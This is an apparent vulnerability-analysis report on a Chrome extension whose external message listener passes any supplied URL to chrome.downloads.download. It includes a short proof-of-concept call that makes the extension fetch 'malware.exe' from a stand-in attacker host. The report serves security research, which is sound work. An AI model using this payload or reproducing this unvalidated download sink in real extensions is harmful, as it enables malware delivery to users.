# CoCo Analysis: eagbbfkmjoblikpblbmejmblfhokbpaa

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_downloads_download_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/eagbbfkmjoblikpblbmejmblfhokbpaa/opgen_generated_files/bg.js
Line 982			chrome.downloads.download({ url: request.url })
	request.url
```

**Code:**

```javascript
// Background script - Lines 980-986
chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
	if (request.contentScriptQuery == "downloadUrl") {
		chrome.downloads.download({ url: request.url }) // ← Arbitrary download sink
	}

	return true
})
```

**Manifest:**
```json
{
  "permissions": ["downloads"],
  "externally_connectable": {
    "matches": ["*://*.mover.uz/*"]
  }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any whitelisted domain (e.g., https://mover.uz/* or http://subdomain.mover.uz/*)
chrome.runtime.sendMessage(
    'eagbbfkmjoblikpblbmejmblfhokbpaa',
    {
        contentScriptQuery: 'downloadUrl',
        url: 'https://attacker.com/malware.exe'
    }
);
```

**Impact:** Arbitrary file download vulnerability. An external attacker controlling a whitelisted mover.uz domain (or any subdomain) can trigger the extension to download arbitrary files from any URL to the user's machine. This can be used to deliver malware, trojans, or other malicious payloads. While the extension restricts external messages to mover.uz domains, per the methodology, we ignore manifest.json restrictions - if even ONE domain can exploit it, it's a TRUE POSITIVE.

---
